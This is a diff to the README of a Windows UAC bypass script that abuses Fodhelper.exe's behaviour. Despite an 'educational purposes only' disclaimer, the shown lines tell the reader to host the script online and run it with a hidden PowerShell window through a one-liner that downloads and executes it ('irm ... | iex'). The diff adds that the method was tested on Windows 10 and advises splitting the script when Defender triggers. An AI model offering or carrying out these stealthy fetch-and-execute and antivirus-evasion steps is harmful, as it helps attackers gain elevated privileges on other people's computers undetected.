@@ -23,6 +23,8 @@ This script and method are shared for educational purposes only. Misuse of this 
 
 ## Usage
 
+### Tested on Windows 10
+
 ### Prerequisites
 - A Windows operating system with UAC enabled (the method works by exploiting **Fodhelper.exe**'s behavior in these environments).
 - PowerShell is required for executing the script.
@@ -38,5 +40,6 @@ This script and method are shared for educational purposes only. Misuse of this 
 ### Tips:
 1. Host your modified script online.
 2. Utilize Run Dialague Box (Win + R) to execute powershell -C "irm 'LinkToThisScript' | iex" and the "-WindowStyle Hidden" flag for stealth
+3. Split the script if Defender is triggered.
 
 
